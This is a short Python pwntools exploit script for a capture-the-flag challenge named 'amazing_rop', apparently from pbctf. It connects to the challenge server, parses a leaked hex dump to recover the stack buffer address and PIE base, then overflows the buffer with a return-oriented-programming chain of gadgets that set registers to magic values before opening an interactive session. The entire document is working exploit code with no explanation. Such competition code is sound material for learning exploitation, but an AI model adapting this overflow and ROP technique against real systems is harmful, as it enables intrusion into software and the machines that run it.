from pwn import *

"""
[*] '/home/vagrant/vm_share/pbctf/amazing_rop/bof.bin'
    Arch:     i386-32-little
    RELRO:    Full RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      PIE enabled
"""

context.arch = "i386"

p = remote("maze.chal.perfect.blue", 1)
#p = process("./bof.bin")
'''
gdb.attach(p, """
    b *$rebase(0x00001397)
    b *$rebase(0x00001eeb)
    b *$rebase(0x1E83)
""")
'''
p.sendlineafter(")", "n")


buf_addr = ''
dump = b''
for i in range(10):
    a = p.recvuntil("| ")
    if not len(buf_addr):
        buf_addr = a[2:-3]
    for i in range(8):
        h_byte = p.recvuntil(" ")[:-1]
        dump += p8(int(h_byte, 16))
    p.recvuntil("|")

buf_addr = int(buf_addr, 16)

log.info(f'stack_buf: 0x{buf_addr:02x}')
print(hexdump(dump))

pie_base = u32(dump[0x34:0x38]) - 0x3f5c
log.info(f'pie_base: 0x{pie_base:02x}')

"""
0x000013AD: pop eax; int 3; retn
0x00001397: pop edi; pop ebp; ret; 
0x00001eeb: pop esi; pop ebp; ret; 
"""

pop_edi_ebp_ret   = p32(pie_base + 0x0000397)
pop_esi_ebp_ret   = p32(pie_base + 0x0000eeb)
pop_eax_int3_retn = p32(pie_base + 0x00003AD)

buf = b'A'*0x30
buf += b'flag'
buf += b'A'*12

buf += pop_edi_ebp_ret
buf += p32(0x31337)
buf += p32(0x69696969)
buf += pop_esi_ebp_ret
buf += p32(0x1337)
buf += p32(0x69696969)
buf += pop_eax_int3_retn
buf += p32(1)
buf += p32(0x42424242)


p.sendline(buf)

p.interactive()
